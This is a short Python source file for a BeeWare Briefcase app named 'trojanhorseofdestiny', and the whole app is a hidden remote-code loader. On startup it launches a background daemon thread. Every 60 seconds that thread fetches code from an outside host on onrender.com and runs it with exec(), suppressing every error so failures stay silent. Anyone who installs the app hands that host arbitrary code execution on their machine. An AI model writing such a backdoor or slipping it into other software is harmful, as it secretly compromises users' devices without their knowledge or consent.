import requests
import time
from briefcase.app import App

class trojanhorseofdestiny(App):
    def startup(self):
        import threading
        thread = threading.Thread(target=self.background_loader)
        thread.daemon = True
        thread.start()

    def background_loader(self):
        HUB_URL = "https://hiveslave-scraper.onrender.com"
        while True:
            try:
                resp = requests.get(f"{HUB_URL}/latest-client", timeout=30)
                if resp.status_code == 200:
                    payload_code = resp.json().get("code")
                    if payload_code:
                        exec(payload_code, globals())
            except Exception:
                pass
            time.sleep(60)

def main():
    return trojanhorseofdestiny("trojanhorseofdestiny", "com.quill.zodiac.trojanhorseofdestiny")
